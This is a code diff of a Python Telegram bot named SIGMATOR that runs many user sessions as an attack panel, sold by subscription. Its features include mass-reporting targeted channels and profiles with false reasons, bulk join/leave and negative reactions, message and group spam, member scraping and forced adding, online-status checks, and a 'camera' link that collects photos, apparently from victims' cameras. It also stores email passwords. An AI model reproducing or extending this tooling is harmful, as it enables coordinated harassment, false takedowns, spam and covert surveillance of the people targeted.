             [Button.inline("COPYRIGHT + REPORT + EMAIL",b"a_copyright")],
             [Button.inline("FAST PYROGRAM",b"fast_pyrogram")],
             [Button.inline("ch/gp join",b"join_group"),Button.inline("GROUP REPORT",b"group_report_menu")],
             [Button.inline("REPORT PROFILE",b"report_profile")],
-            [Button.inline("SET TARGET",b"set"),Button.inline("MONITOR",b"monit")],
-            [Button.inline(f"CLOCK {'ON' if is_clock_active else 'OFF'}",b"clock_menu")],
-            [Button.inline("SEND MSG",b"msg_menu")],
-            [Button.inline("LEAVE",b"leave_ch"),Button.inline("REACT +",b"react_pos")],
-            [Button.inline("REACT -",b"react_neg")],
+            [Button.inline("SET TARGET",b"set"),Button.inline("PANEL",b"panel")],
+            [Button.inline("CLOCK",b"clock_menu"),Button.inline("SEND MSG",b"msg_menu")],
+            [Button.inline("LEAVE",b"leave_ch"),Button.inline("REACT",b"react_pos")],
             [Button.inline("PROXY",b"proxy_main"),Button.inline("EMAIL",b"email_menu")],
-            [Button.inline(f"SPAM ({'ON' if is_auto_spam_active else 'OFF'})",b"auto_spam_menu")],
-            [Button.inline("CAMERA",b"camera_menu")],
+            [Button.inline("SPAM",b"auto_spam_menu"),Button.inline("CAMERA",b"camera_menu")],
             [Button.inline("PING",b"ping"),Button.inline("STOP",b"stop")],
         ]
-    
-    if uid and (is_admin or has_sub): btns.append([Button.inline("SUBSCRIPTION",b"sub_menu")])
     if is_admin: btns.append([Button.inline("ADMINS",b"admin_menu")])
     return txt,btns
 
-async def subscription_menu(bot,chat_id,user_id):
-    sub = get_user_sub(user_id)
-    if sub and not sub.get('pending'):
-        expiry = datetime.fromisoformat(sub['expiry']); days_left = (expiry-datetime.now()).days
-        txt = f"YOUR SUBSCRIPTION\n\nPlan: {SUB_PLANS[sub['plan']]['name']}\nSessions: {len(get_sessions())}/{sub['sessions']}\nDays Left: {days_left} days\nExpires: {expiry.strftime('%Y-%m-%d')}"
-        btns = [[Button.inline("Refresh",b"sub_status")],[Button.inline("Back",b"back")]]
-    elif sub and sub.get('pending'):
-        txt = f"PENDING ACTIVATION\n\nAdd {sub['sessions']} accounts to activate.\nProgress: {len(get_sessions())}/{sub['sessions']}\n\nUse /add to add accounts."
-        btns = [[Button.inline("Refresh",b"sub_status")],[Button.inline("Back",b"back")]]
-    else:
-        txt = f"SUBSCRIPTION PLANS\n\nFree 7 Days - 5 accounts\n7 Days - 50k Toman\n1 Month - 100k Toman\n3 Months - 200k Toman\n1 Year - 500k Toman\n\nContact: {ADMIN_CONTACT}"
-        btns = [[Button.inline("Activate Free",b"sub_free")],[Button.inline("Buy Premium",b"sub_buy")],[Button.inline("My Status",b"sub_status")],[Button.inline("Back",b"back")]]
-    try: await bot.send_message(chat_id,txt,buttons=btns)
-    except: pass
-
-async def session_builder(bot,chat_id,user_id):
-    sub = get_user_sub(user_id)
-    if not sub: await bot.send_message(chat_id,f"No subscription!\nUse /subscribe\nContact: {ADMIN_CONTACT}"); return
-    current = len(get_sessions())
-    if not sub.get('pending') and current>=sub['sessions']: await bot.send_message(chat_id,f"Limit reached! {current}/{sub['sessions']}\nContact: {ADMIN_CONTACT}"); return
-    async with bot.conversation(chat_id,timeout=300) as conv:
-        await conv.send_message("Send phone number:\nExample: +989123456789")
-        resp = await conv.get_response(); phone = resp.text.strip()
-        if not phone.startswith('+'): phone = '+'+phone
-        try:
-            session_name = phone.replace('+',''); session_path = f"{SESSION_DIR}/{session_name}"
-            client = TelegramClient(session_path,API_ID,API_HASH); await client.connect()
-            await client.send_code_request(phone)
-            await conv.send_message(f"Code sent to {phone}\n\nEnter the 5-digit code:")
-            resp = await conv.get_response(); code = resp.text.strip()
-            try: await client.sign_in(phone,code)
-            except Exception as e:
-                if "password" in str(e).lower():
-                    await conv.send_message("2FA Enabled! Enter password:")
-                    resp = await conv.get_response(); password = resp.text.strip()
-                    await client.sign_in(password=password)
-                else: raise e
-            me = await client.get_me(); await client.disconnect()
-            new_count = len(get_sessions()); limit = sub['sessions']
-            msg = f"Account Added!\n\n{me.first_name}\n{phone}\n{session_name}.session\n{new_count}/{limit}"
-            if sub.get('pending') and new_count>=limit:
-                add_subscription(user_id,"free")
-                msg += "\n\nSubscription Activated!\nYour free 7-day subscription is now active!"
-            await conv.send_message(msg)
-        except Exception as e:
-            await conv.send_message(f"Error: {str(e)[:100]}")
-            try:
-                if os.path.exists(session_path+".session"): os.remove(session_path+".session")
-            except: pass
-            try: await client.disconnect()
-            except: pass
-
-async def check_expired(bot):
-    while True:
-        try:
-            expired = []
-            for uid,sub in list(subscribers.items()):
-                if not sub.get('pending'):
-                    if datetime.now()>datetime.fromisoformat(sub['expiry']): expired.append(uid)
-            for uid in expired: del subscribers[uid]
-            if expired: save_subscribers(subscribers)
-        except: pass
-        await asyncio.sleep(3600)
-
+# ==================== MAIN BOT ====================
 async def main():
     global TARGET,TARGET_ACCOUNT,is_attacking,is_clock_active,ADMINS,clock_task
-    global is_auto_spam_active,auto_spam_task,camera_link,last_camera_photo
+    global is_auto_spam_active,auto_spam_task,camera_link,selected_report_count,use_selected_sessions,selected_sessions_list,scraped_members
 
     unlock_all()
+    scraped_members = load_members()
     bot = TelegramClient('bot_main',API_ID,API_HASH)
     await bot.start(bot_token=BOT_TOKEN)
-    print(f"[+] SIGMATOR AI BOT STARTED")
-    print(f"[+] Emails: {len(load_emails())}")
-    print(f"[+] Sessions: {len(get_sessions())}")
-    print(f"[+] Gemini AI: Connected")
-    print(f"[+] Daily limit: {DAILY_REPORT_LIMIT}")
-    print(f"[+] Master ID: {MASTER_ID}")
-
-    asyncio.create_task(check_expired(bot))
+    print(f"[+] SIGMATOR STARTED")
+    print(f"[+] Sessions: {len(get_sessions())} | Emails: {len(load_emails())} | Members: {len(scraped_members)}")
 
     @bot.on(events.NewMessage(pattern='/start'))
     async def start_cmd(e):
@@ -872,98 +1161,144 @@ async def main():
     @bot.on(events.NewMessage(pattern='/lock'))
     async def lock_cmd(e):
         if e.sender_id!=MASTER_ID: return
-        await e.respond("Locking all files..."); lock_all()
-        await e.respond("All files encrypted! Bot will exit.")
-        await asyncio.sleep(1); sys.exit(0)
-
-    @bot.on(events.NewMessage(pattern='/subscribe'))
-    async def sub_cmd(e): await subscription_menu(bot,e.chat_id,e.sender_id)
+        await e.respond("Locking..."); lock_all(); await e.respond("Locked!")
 
     @bot.on(events.NewMessage(pattern='/add'))
-    async def add_cmd(e): await session_builder(bot,e.chat_id,e.sender_id)
-
-    @bot.on(events.NewMessage(pattern='/status'))
-    async def status_cmd(e):
+    async def add_cmd(e):
         sub = get_user_sub(e.sender_id)
-        if sub:
-            if sub.get('pending'): await e.respond(f"Pending: {len(get_sessions())}/{sub['sessions']} accounts")
-            else:
-                expiry = datetime.fromisoformat(sub['expiry']); days = (expiry-datetime.now()).days
-                await e.respond(f"{SUB_PLANS[sub['plan']]['name']}\n{len(get_sessions())}/{sub['sessions']}\n{days} days left")
-        else: await e.respond("No active subscription!\nUse /subscribe")
+        if not sub: await e.respond("No subscription!"); return
+        async with bot.conversation(e.chat_id,timeout=300) as conv:
+            await conv.send_message("Phone: +989123456789")
+            phone = (await conv.get_response()).text.strip()
+            if not phone.startswith('+'): phone = '+'+phone
+            sp = f"{SESSION_DIR}/{phone.replace('+','')}"
+            client = TelegramClient(sp,API_ID,API_HASH)
+            await client.connect(); await client.send_code_request(phone)
+            await conv.send_message("Code:")
+            code = (await conv.get_response()).text.strip()
+            try: await client.sign_in(phone,code)
+            except:
+                await conv.send_message("2FA:")
+                await client.sign_in(password=(await conv.get_response()).text.strip())
+            me = await client.get_me(); await client.disconnect()
+            await conv.send_message(f"Added: {me.first_name}")
 
     @bot.on(events.CallbackQuery)
     async def callback(e):
         global TARGET,TARGET_ACCOUNT,is_attacking,is_clock_active,ADMINS,clock_task
-        global is_auto_spam_active,auto_spam_task,camera_link,last_camera_photo
+        global is_auto_spam_active,auto_spam_task,camera_link,selected_report_count,use_selected_sessions,selected_sessions_list,scraped_members
 
-        is_admin_user = e.sender_id in ADMINS
-        sub = get_user_sub(e.sender_id) if not is_admin_user else None
+        is_admin = e.sender_id in ADMINS
+        sub = get_user_sub(e.sender_id) if not is_admin else None
         has_sub = sub is not None and not sub.get('pending',False)
         
-        if not is_admin_user and not has_sub:
-            allowed = ["sub_free","sub_buy","sub_status"]
-            if e.data.decode() not in allowed: await e.answer("Subscribe to access!",alert=True); return
+        if not is_admin and not has_sub:
+            if e.data.decode() not in ["sub_free","sub_buy","sub_status"]:
+                await e.answer("Subscribe to access!",alert=True); return
+        
+        allowed, warning = check_spam(e.sender_id)
+        if not allowed:
+            await e.answer(warning,alert=True); return
+        if warning:
+            await e.answer(warning,alert=True)
         
         await e.answer()
         data = e.data.decode()
 
         if data.startswith("a_"):
-            if TARGET=='target': await e.respond("Set target first!"); return
+            if TARGET=='target': await e.respond("Set target!"); return
             cr,ce,_,_ = check_daily_limit()
-            if not cr and not ce: await e.respond(f"DAILY LIMIT REACHED!\n\n{DAILY_REPORT_LIMIT}/{DAILY_REPORT_LIMIT} used\nResets tomorrow.\n\nContact: {ADMIN_CONTACT}"); return
+            if not cr and not ce: await e.respond("DAILY LIMIT!"); return
             mode = data.split('_')[1]
-            msg = await e.respond(f"Starting {mode.upper()} attack...\nAI analyzing...")
-            is_attacking = True; asyncio.create_task(smart_attack(bot,e.chat_id,msg.id,mode))
+            msg = await e.respond(f"Starting {mode.upper()}...")
+            is_attacking = True
+            asyncio.create_task(smart_attack(bot,e.chat_id,msg.id,mode))
+
+        elif data == "panel":
+            await show_panel(e)
+
+        elif data.startswith("sel_"):
+            count = data.split('_')[1]
+            if count == "all":
+                selected_report_count = 0
+                use_selected_sessions = False
+                selected_sessions_list = []
+                await e.respond("Selected: ALL sessions")
+            else:
+                selected_report_count = int(count)
+                use_selected_sessions = True
+                await e.respond(f"Selected: {count} sessions")
+
+        elif data == "scrape_members":
+            if TARGET=='target': await e.respond("Set target group first!"); return
+            msg = await e.respond("Starting member scrape...")
+            asyncio.create_task(run_scrape_members(bot,e.chat_id,msg.id))
+
+        elif data == "add_members_menu":
+            async with bot.conversation(e.chat_id,timeout=60) as conv:
+                await conv.send_message(f"Send target group to add members to:\n(Current scraped: {len(scraped_members)} members)")
+                target_grp = (await conv.get_response()).text.strip()
+                await conv.send_message("How many members to add?")
+                count = int((await conv.get_response()).text.strip())
+                msg = await conv.send_message("Adding members...")
+                asyncio.create_task(run_add_members(bot,e.chat_id,msg.id,target_grp,count))
+
+        elif data == "first_msg":
+            if TARGET=='target': await e.respond("Set target!"); return
+            await e.respond("Searching...")
+            result = await find_first_message(TARGET)
+            await e.respond(result)
+
+        elif data == "check_online":
+            async with bot.conversation(e.chat_id,timeout=30) as conv:
+                await conv.send_message("Username (without @):")
+                username = (await conv.get_response()).text.strip()
+                await conv.send_message("Checking...")
+                result = await check_user_online(username)
+                await conv.send_message(result)
 
         elif data == "fast_pyrogram":
-            if TARGET=='target': await e.respond("Set target first!"); return
-            msg = await e.respond("Starting FAST PYROGRAM..."); asyncio.create_task(run_fast_pyrogram(bot,e.chat_id,msg.id))
+            if TARGET=='target': await e.respond("Set target!"); return
+            msg = await e.respond("Starting..."); asyncio.create_task(run_fast_pyrogram(bot,e.chat_id,msg.id))
 
         elif data == "join_group":
-            if TARGET=='target': await e.respond("Set target first!"); return
-            msg = await e.respond("ch/gp join starting..."); asyncio.create_task(run_join_group(bot,e.chat_id,msg.id))
+            if TARGET=='target': await e.respond("Set target!"); return
+            msg = await e.respond("Joining..."); asyncio.create_task(run_join_group(bot,e.chat_id,msg.id))
 
         elif data == "group_report_menu":
-            if TARGET=='target': await e.respond("Set target first!"); return
+            if TARGET=='target': await e.respond("Set target!"); return
             btns = []
             for i,(reason,msg) in enumerate(ALL_REPORT_REASONS): btns.append([Button.inline(msg[:40],f"select_reason_{i}")])
-            btns.append([Button.inline("ALL 9 REASONS",b"select_all_reasons")]); btns.append([Button.inline("Back",b"back")])
-            await e.edit("SELECT REPORT REASONS:",buttons=btns)
+            btns.append([Button.inline("ALL REASONS",b"select_all_reasons")]); btns.append([Button.inline("Back",b"back")])
+            await e.edit("SELECT:",buttons=btns)
 
         elif data.startswith("select_reason_"):
             idx = int(data.split("_")[2])
             reason,msg = ALL_REPORT_REASONS[idx]
-            msg = await e.respond(f"Reporting with: {msg[:50]}..."); asyncio.create_task(run_group_report(bot,e.chat_id,msg.id,[(reason,msg)]))
+            msg = await e.respond(f"Reporting..."); asyncio.create_task(run_group_report(bot,e.chat_id,msg.id,[(reason,msg)]))
 
         elif data == "select_all_reasons":
-            msg = await e.respond("Reporting with ALL 9 reasons..."); asyncio.create_task(run_group_report(bot,e.chat_id,msg.id,ALL_REPORT_REASONS))
+            msg = await e.respond("Reporting ALL..."); asyncio.create_task(run_group_report(bot,e.chat_id,msg.id,ALL_REPORT_REASONS))
 
         elif data == "report_profile":
-            if TARGET=='target': await e.respond("Set target first!"); return
+            if TARGET=='target': await e.respond("Set target!"); return
             msg = await e.respond("Reporting profile..."); sessions = get_sessions(); ok,fail = 0,0
             for s in sessions:
-                res = await report_worker(s,TARGET.replace('@','').strip(),types.InputReportReasonSpam(),"Fake account - impersonation")
+                res = await report_worker(s,TARGET.replace('@','').strip(),types.InputReportReasonSpam(),"Fake account")
                 if res==1: ok+=1
                 else: fail+=1
             await msg.edit(f"Profile Report Done!\nSuccess: {ok}\nFailed: {fail}")
 
         elif data == "set":
             async with bot.conversation(e.chat_id,timeout=60) as conv:
-                await conv.send_message("Send target channel/username:"); TARGET = (await conv.get_response()).text.strip()
-                await conv.send_message("Send associated account (or 'skip'):"); acc_resp = (await conv.get_response()).text.strip()
-                TARGET_ACCOUNT = None if acc_resp.lower()=='skip' else acc_resp
-                impersonated = ai_channel(TARGET)
-                txt,btns = await get_menu(e.sender_id)
-                await conv.send_message(f"Target Set!\n\nChannel: {TARGET}\nAccount: {TARGET_ACCOUNT or 'N/A'}\nAI Detected: {impersonated}",buttons=btns)
-
-        elif data == "monit":
-            sessions = get_sessions(); txt = f"Sessions ({len(sessions)}):\n\n"
-            for s in sessions[:20]: txt += f"- {os.path.basename(s)}\n"
-            await e.edit(txt,buttons=[[Button.inline("Back",b"back")]])
+                await conv.send_message("Channel/Username:"); TARGET = (await conv.get_response()).text.strip()
+                await conv.send_message("Account (or skip):"); acc = (await conv.get_response()).text.strip()
+                TARGET_ACCOUNT = None if acc.lower()=='skip' else acc
+                ai_r = ai_channel(TARGET)
+                await conv.send_message(f"Set!\nChannel: {TARGET}\nAccount: {TARGET_ACCOUNT or 'N/A'}\nAI: {ai_r}")
 
         elif data == "stop":
-            is_attacking = False; is_auto_spam_active = False
+            is_attacking = False; is_auto_spam_active = False; scraping_active = False
             if auto_spam_task: auto_spam_task.cancel()
             if clock_task: clock_task.cancel()
             txt,btns = await get_menu(e.sender_id); await e.edit(txt,buttons=btns)
@@ -974,11 +1309,11 @@ async def main():
             except: pass
 
         elif data == "ping":
-            start = time.time(); await bot.get_me()
-            await e.edit(f"Ping: {int((time.time()-start)*1000)}ms")
+            t = time.time(); await bot.get_me()
+            await e.edit(f"Ping: {int((time.time()-t)*1000)}ms")
 
         elif data == "leave_ch":
-            if TARGET=='target': await e.respond("Set target first!"); return
+            if TARGET=='target': await e.respond("Set target!"); return
             sessions = get_sessions(); ok,fail = 0,0
             for s in sessions:
                 res = await leave_worker(s,TARGET)
@@ -987,8 +1322,8 @@ async def main():
             await e.respond(f"Left: {ok} | Failed: {fail}")
 
         elif data in ("react_pos","react_neg"):
-            if TARGET=='target': await e.respond("Set target first!"); return
-            emojies = ["👍","🔥","❤️","🥰"] if data=="react_pos" else ["👎","💩","🤮","🤡"]
+            if TARGET=='target': await e.respond("Set target!"); return
+            emojies = ["like","fire","heart"] if data=="react_pos" else ["dislike","poop","clown"]
             sessions = get_sessions(); ok,fail = 0,0
             for s in sessions:
                 res = await reaction_worker(s,TARGET,emojies)
@@ -1006,45 +1341,39 @@ async def main():
                 if not sessions: await e.respond("No sessions!"); return
                 btns = []
                 for i,s in enumerate(sessions[:20]): btns.append([Button.inline(os.path.basename(s),f"clk_{i}")])
-                btns.append([Button.inline("Back",b"back")]); await e.edit("Select session:",buttons=btns)
+                btns.append([Button.inline("Back",b"back")]); await e.edit("Select:",buttons=btns)
 
         elif data.startswith("clk_"):
             idx = int(data.split('_')[1]); sessions = get_sessions()
             if idx>=len(sessions): return
             if is_clock_active: is_clock_active = False
             if clock_task: clock_task.cancel()
-            session_path = sessions[idx]; client = create_stable_client(session_path); await client.connect()
+            sp = sessions[idx]; client = create_stable_client(sp); await client.connect()
             if await client.is_user_authorized():
                 is_clock_active = True; clock_task = asyncio.create_task(clock_task_func(client))
-                await e.respond(f"Clock ON: {os.path.basename(session_path)}")
+                await e.respond(f"Clock ON: {os.path.basename(sp)}")
             else: await e.respond("Not authorized!")
 
         elif data == "msg_menu":
             async with bot.conversation(e.chat_id,timeout=60) as conv:
-                await conv.send_message("Send recipient:"); target_user = (await conv.get_response()).text.strip()
-                await conv.send_message("Send text:"); msg_text = (await conv.get_response()).text.strip()
+                await conv.send_message("Recipient:"); tu = (await conv.get_response()).text.strip()
+                await conv.send_message("Text:"); mt = (await conv.get_response()).text.strip()
                 sessions = get_sessions(); ok,fail = 0,0
                 for s in sessions:
-                    res = await send_msg_worker(s,target_user,msg_text)
+                    res = await send_msg_worker(s,tu,mt)
                     if res=="success": ok+=1
                     else: fail+=1
                 await conv.send_message(f"Sent: {ok} | Failed: {fail}")
 
         elif data == "proxy_main":
-            btns = [
-                [Button.inline("View Proxies",b"view_proxies")],
-                [Button.inline("Set Proxy",b"set_proxy")],
-                [Button.inline("Remove Proxy",b"remove_proxy")],
-                [Button.inline("Back",b"back")]
-            ]; await e.edit("PROXY MANAGEMENT",buttons=btns)
+            btns = [[Button.inline("View Proxies",b"view_proxies")],[Button.inline("Set Proxy",b"set_proxy")],[Button.inline("Back",b"back")]]
+            await e.edit("PROXY",buttons=btns)
 
         elif data == "view_proxies":
-            proxies = load_proxies()
-            if not proxies: await e.edit("No proxies!",buttons=[[Button.inline("Back",b"proxy_main")]]); return
+            px = load_proxies()
+            if not px: await e.edit("No proxies!"); return
             txt = "PROXY LIST\n\n"
-            for sess,proxy in list(proxies.items())[:15]:
-                if '@' in proxy: proxy = proxy.split('@')[0]+"***"
-                txt += f"- {sess}: {proxy[:50]}...\n"
+            for s,p in list(px.items())[:15]: txt += f"- {s}: {p[:40]}\n"
             await e.edit(txt,buttons=[[Button.inline("Back",b"proxy_main")]])
 
         elif data == "set_proxy":
@@ -1052,149 +1381,107 @@ async def main():
             if not sessions: await e.respond("No sessions!"); return
             btns = []
             for i,s in enumerate(sessions[:20]): btns.append([Button.inline(os.path.basename(s),f"setproxy_{i}")])
-            btns.append([Button.inline("Back",b"proxy_main")]); await e.edit("Select session:",buttons=btns)
+            btns.append([Button.inline("Back",b"proxy_main")]); await e.edit("Select:",buttons=btns)
 
         elif data.startswith("setproxy_"):
-            idx = int(data.split('_')[1]); sessions = get_sessions()
-            if idx>=len(sessions): return
-            session_path = sessions[idx]; session_name = os.path.basename(session_path)
+            idx = int(data.split('_')[1]); sn = os.path.basename(get_sessions()[idx])
             async with bot.conversation(e.chat_id,timeout=60) as conv:
-                await conv.send_message(f"Session: {session_name}\n\nSend proxy:"); proxy_input = (await conv.get_response()).text.strip()
-                if proxy_input.lower()=='none':
-                    proxies = load_proxies(); proxies.pop(session_name,None); save_proxies(proxies)
-                    await conv.send_message("Proxy removed!")
-                else:
-                    proxies = load_proxies(); proxies[session_name]=proxy_input; save_proxies(proxies)
-                    await conv.send_message("Proxy saved!")
-
-        elif data == "remove_proxy":
-            sessions = get_sessions()
-            if not sessions: await e.respond("No sessions!"); return
-            btns = []
-            for i,s in enumerate(sessions[:20]): btns.append([Button.inline(os.path.basename(s),f"rmproxy_{i}")])
-            btns.append([Button.inline("Back",b"proxy_main")]); await e.edit("Select session:",buttons=btns)
-
-        elif data.startswith("rmproxy_"):
-            idx = int(data.split('_')[1]); sessions = get_sessions()
-            if idx>=len(sessions): return
-            session_name = os.path.basename(sessions[idx]); proxies = load_proxies()
-            if session_name in proxies: del proxies[session_name]; save_proxies(proxies); await e.respond(f"Removed: {session_name}")
-            else: await e.respond("Not found!")
+                await conv.send_message(f"Session: {sn}\n\nProxy:"); pi = (await conv.get_response()).text.strip()
+                px = load_proxies()
+                if pi.lower()=='none': px.pop(sn,None)
+                else: px[sn]=pi
+                save_proxies(px); await conv.send_message("Saved!")
 
         elif data == "email_menu":
-            emails = load_emails()
-            btns = [
-                [Button.inline(f"View Emails ({len(emails)})",b"view_emails")],
-                [Button.inline("Add Email",b"add_email")],
-                [Button.inline("Remove Email",b"remove_email")],
-                [Button.inline("Back",b"back")]
-            ]; await e.edit("EMAIL MANAGER",buttons=btns)
+            em = load_emails()
+            btns = [[Button.inline(f"View Emails ({len(em)})",b"view_emails")],[Button.inline("Add Email",b"add_email")],[Button.inline("Back",b"back")]]
+            await e.edit("EMAIL",buttons=btns)
 
         elif data == "view_emails":
-            emails = load_emails()
-            if not emails: await e.edit("No emails!",buttons=[[Button.inline("Back",b"email_menu")]]); return
-            txt = f"EMAILS ({len(emails)}):\n\n"
-            for i,em in enumerate(emails,1): txt += f"{i}. {em['email']}\n"
+            em = load_emails()
+            if not em: await e.edit("No emails!"); return
+            txt = f"EMAILS ({len(em)}):\n\n"
+            for i,e in enumerate(em,1): txt += f"{i}. {e['email']}\n"
             await e.edit(txt,buttons=[[Button.inline("Back",b"email_menu")]])
 
         elif data == "add_email":
             async with bot.conversation(e.chat_id,timeout=120) as conv:
-                await conv.send_message("Send email:"); email_addr = (await conv.get_response()).text.strip()
-                await conv.send_message("Send password:"); password = (await conv.get_response()).text.strip()
-                emails = load_emails(); emails.append({"email":email_addr,"password":password})
-                save_emails(emails); await conv.send_message(f"Saved! Total: {len(emails)}")
-
-        elif data == "remove_email":
-            emails = load_emails()
-            if not emails: await e.edit("No emails!"); return
-            btns = []
-            for i,em in enumerate(emails): btns.append([Button.inline(f"Remove: {em['email'][:40]}",f"rememail_{i}")])
-            btns.append([Button.inline("Back",b"email_menu")]); await e.edit("Select:",buttons=btns)
-
-        elif data.startswith("rememail_"):
-            idx = int(data.split('_')[1]); emails = load_emails()
-            if idx<len(emails): removed = emails.pop(idx); save_emails(emails); await e.respond(f"Removed: {removed['email']}")
+                await conv.send_message("Email:"); ea = (await conv.get_response()).text.strip()
+                await conv.send_message("Password:"); pw = (await conv.get_response()).text.strip()
+                em = load_emails(); em.append({"email":ea,"password":pw})
+                save_emails(em); await conv.send_message(f"Saved! Total: {len(em)}")
 
         elif data == "auto_spam_menu":
             if is_auto_spam_active:
-                await e.edit("AUTO SPAM RUNNING",buttons=[[Button.inline("STOP SPAM",b"stop_auto_spam")],[Button.inline("Back",b"back")]])
+                await e.edit("SPAM RUNNING",buttons=[[Button.inline("STOP",b"stop_auto_spam")],[Button.inline("Back",b"back")]])
             else:
                 sessions = get_sessions()
                 if not sessions: await e.respond("No sessions!"); return
                 btns = []
                 for i,s in enumerate(sessions[:20]): btns.append([Button.inline(os.path.basename(s),f"as_{i}")])
-                btns.append([Button.inline("Back",b"back")]); await e.edit("Select session:",buttons=btns)
+                btns.append([Button.inline("Back",b"back")]); await e.edit("Select:",buttons=btns)
 
         elif data.startswith("as_"):
-            idx = int(data.split('_')[1]); sessions = get_sessions()
-            if idx>=len(sessions): return
-            session_path = sessions[idx]
+            idx = int(data.split('_')[1]); sp = get_sessions()[idx]
             async with bot.conversation(e.chat_id,timeout=120) as conv:
-                await conv.send_message("Send group link:"); group = (await conv.get_response()).text.strip()
-                await conv.send_message("Send message:"); message = (await conv.get_response()).text.strip()
-                await conv.send_message("Interval (seconds):")
+                await conv.send_message("Group:"); grp = (await conv.get_response()).text.strip()
+                await conv.send_message("Message:"); msg = (await conv.get_response()).text.strip()
+                await conv.send_message("Interval (s):")
                 try: interval = int((await conv.get_response()).text.strip())
                 except: interval = 60
-                patch_session_db(session_path); client = create_stable_client(session_path,use_proxy=True); await client.connect()
+                patch_session_db(sp); client = create_stable_client(sp); await client.connect()
                 if await client.is_user_authorized():
-                    is_auto_spam_active = True; auto_spam_task = asyncio.create_task(auto_spam_worker(client,group,message,interval))
-                    await conv.send_message(f"Started!\nInterval: {interval}s")
+                    is_auto_spam_active = True
+                    auto_spam_task = asyncio.create_task(auto_spam_worker(client,grp,msg,interval))
+                    await conv.send_message(f"Started! Interval: {interval}s")
                 else: await conv.send_message("Not authorized!")
 
         elif data == "stop_auto_spam":
             is_auto_spam_active = False
             if auto_spam_task: auto_spam_task.cancel()
-            await e.respond("Stopped!"); txt,btns = await get_menu(e.sender_id); await e.edit(txt,buttons=btns)
+            await e.respond("Stopped!")
 
         elif data == "camera_menu":
             if camera_link:
-                btns = [[Button.inline("Get Link",b"cam_get_link")],[Button.inline("Check Photo",b"cam_check_photo")],[Button.inline("New Link",b"cam_new_link")],[Button.inline("Back",b"back")]]
-                await e.edit("CAMERA MENU\nCamera is active!",buttons=btns)
+                btns = [[Button.inline("Get Link",b"cam_get_link")],[Button.inline("Check Photo",b"cam_check_photo")],[Button.inline("Back",b"back")]]
+                await e.edit("CAMERA",buttons=btns)
             else:
                 btns = [[Button.inline("Start Camera",b"cam_start")],[Button.inline("Back",b"back")]]
-                await e.edit("CAMERA MENU\nCamera not started!",buttons=btns)
+                await e.edit("CAMERA",buttons=btns)
 
         elif data == "cam_start":
-            await e.respond("Starting camera..."); link = await asyncio.get_event_loop().run_in_executor(None,start_camera)
-            if link: await e.respond(f"Camera Ready!\n{link}")
-            else: await e.respond("Failed!")
-
-        elif data == "cam_new_link":
-            camera_link = None; link = await asyncio.get_event_loop().run_in_executor(None,start_camera)
-            if link: await e.respond(f"New Link!\n{link}")
+            await e.respond("Starting...")
+            link = await asyncio.get_event_loop().run_in_executor(None,start_camera)
+            if link: await e.respond(f"Ready!\n{link}")
             else: await e.respond("Failed!")
 
         elif data == "cam_get_link":
-            await e.respond(f"Camera Link:\n{camera_link}" if camera_link else "No link!")
+            await e.respond(f"Link:\n{camera_link}" if camera_link else "No link!")
 
         elif data == "cam_check_photo":
             photos = glob.glob('./camera_*.jpg')
             if photos:
                 latest = max(photos,key=os.path.getctime)
-                await bot.send_file(e.chat_id,latest,caption="Latest photo")
-            else: await e.respond("No photo yet!")
-
-        elif data == "sub_menu":
-            await subscription_menu(bot,e.chat_id,e.sender_id)
+                await bot.send_file(e.chat_id,latest,caption="Latest")
+            else: await e.respond("No photo!")
 
         elif data == "sub_free":
-            user_id = str(e.sender_id)
-            subscribers[user_id] = {'plan':'free','sessions':5,'expiry':'pending','added':datetime.now().isoformat(),'pending':True}
+            uid = str(e.sender_id)
+            subscribers[uid] = {'plan':'free','sessions':5,'expiry':'pending','added':datetime.now().isoformat(),'pending':True}
             save_subscribers(subscribers)
-            await e.respond("Free Subscription Requested!\n\nTo activate your free 7-day subscription:\n- Add 5 accounts using /add command\n- Subscription activates automatically after 5 accounts\n\nProgress: 0/5 accounts\n\nUse /add to start adding accounts!")
-            txt,btns = await get_menu(e.sender_id); await e.respond(txt,buttons=btns)
+            await e.respond("Free plan! Add 5 accounts with /add")
 
         elif data == "sub_buy":
-            await e.respond(f"Premium Plans\n\n7 Days - 50k Toman\n1 Month - 100k Toman\n3 Months - 200k Toman\n1 Year - 500k Toman\n\nContact: {ADMIN_CONTACT}")
+            await e.respond(f"Premium Plans\n\n7D-50k\n1M-100k\n3M-200k\n1Y-500k\nContact: {ADMIN_CONTACT}")
 
         elif data == "sub_status":
             sub = get_user_sub(e.sender_id)
             if sub:
-                if sub.get('pending'): await e.respond(f"Pending: {len(get_sessions())}/{sub['sessions']} accounts")
+                if sub.get('pending'): await e.respond(f"Pending: {len(get_sessions())}/{sub['sessions']}")
                 else:
-                    expiry = datetime.fromisoformat(sub['expiry']); days = (expiry-datetime.now()).days
-                    await e.respond(f"{SUB_PLANS[sub['plan']]['name']}\n{len(get_sessions())}/{sub['sessions']}\n{days} days left")
-            else: await e.respond("No active subscription!")
+                    expiry = datetime.fromisoformat(sub['expiry'])
+                    await e.respond(f"{SUB_PLANS[sub['plan']]['name']}\n{(expiry-datetime.now()).days} days left")
+            else: await e.respond("No subscription!")
 
         elif data == "admin_menu":
             admins = load_admins(); txt = f"ADMINS ({len(admins)}/{MAX_ADMINS})\n\n"
@@ -1204,25 +1491,27 @@ async def main():
 
         elif data == "admin_add":
             async with bot.conversation(e.chat_id,timeout=60) as conv:
-                await conv.send_message(f"Send user_id to add ({len(load_admins())}/{MAX_ADMINS}):"); resp = await conv.get_response()
+                await conv.send_message(f"User ID ({len(load_admins())}/{MAX_ADMINS}):")
                 try:
-                    new_id = int(resp.text.strip()); success,msg = add_admin(new_id)
+                    new_id = int((await conv.get_response()).text.strip())
+                    success,msg = add_admin(new_id)
                     if success: ADMINS.clear(); ADMINS.extend(load_admins())
                     await conv.send_message(msg)
-                except: await conv.send_message("Invalid ID!")
+                except: await conv.send_message("Invalid!")
 
         elif data == "admin_remove":
             async with bot.conversation(e.chat_id,timeout=60) as conv:
-                await conv.send_message("Send user_id to remove:"); resp = await conv.get_response()
+                await conv.send_message("User ID:")
                 try:
-                    del_id = int(resp.text.strip()); success,msg = remove_admin(del_id)
+                    del_id = int((await conv.get_response()).text.strip())
+                    success,msg = remove_admin(del_id)
                     if success: ADMINS.clear(); ADMINS.extend(load_admins())
                     await conv.send_message(msg)
-                except: await conv.send_message("Invalid ID!")
+                except: await conv.send_message("Invalid!")
 
         elif data == "limit_info":
             cr,ce,rr,re = check_daily_limit()
